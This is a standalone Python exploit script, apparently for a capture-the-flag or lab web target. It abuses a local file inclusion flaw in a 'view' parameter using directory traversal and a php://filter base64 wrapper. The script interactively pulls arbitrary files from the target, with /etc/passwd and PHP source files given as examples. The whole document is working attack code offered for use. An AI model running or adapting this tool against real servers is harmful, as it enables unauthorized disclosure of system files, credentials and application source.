#!/usr/bin/python3

# Built-in libraries:
import os
import sys
import subprocess
import re
import base64

# Third-party libraries:
import requests

# Get File extension:
def extension(filename):
    return os.path.splitext(filename)[1]

# Craft Payload:
def payload(file_path):
    filename = file_path.split('.')[0]
    if extension(file_path) == '.php':
        return f'php://filter/convert.base64-encode/resource=/var/www/html/cat.php../../../../..{filename}'
    else:
        return f'/var/www/html/cat.php../../../../..{filename}'

# Exploit the vulnerability:
def exploit(ip, filename):

    url = f'http://{ip}/?view={payload(filename)}&ext={extension(filename)}'
    response = requests.get(url, timeout=10)

    data = re.search('Here you go!(.*?)</div>', response.text, re.DOTALL).group(1)
    return data


if __name__ == '__main__':
    try:
        ip = input('[*] Enter the ip address of the target machine: ')
        # Checking if the provided ip_address is reachable:
        ping = subprocess.Popen(['ping', '-c', '1', '-W', '5', ip], stdout=subprocess.PIPE)
        if "1 received" in ping.communicate()[0].decode('utf-8'):
            print('[*] Enter the full path of the file you want to retrieve (/etc/passwd, /var/www/html/index.php, ...)')
            while True:
                filename = input('\t>> ')
                data = exploit(ip, filename)
                if 'include(): Failed opening' in data:
                    print(f'[-] Could not retrieve {filename} !!')
                else:
                    if extension(filename) == '.php':
                        data = base64.b64decode(data)
                        print(data.decode('utf-8'))
                    else:
                        print(data)
        else:
            print('[-] Target Machine is unreachable !!')

    except KeyboardInterrupt:
        print('\n[*] ... Quitting ...')
    except requests.exceptions.ReadTimeout:
        print('[-] Timeout !! Target Machine is unreachable :(')
        sys.exit()

    except Exception as e:
        print('[-] Something went wrong :(')
        print(e)
        sys.exit()
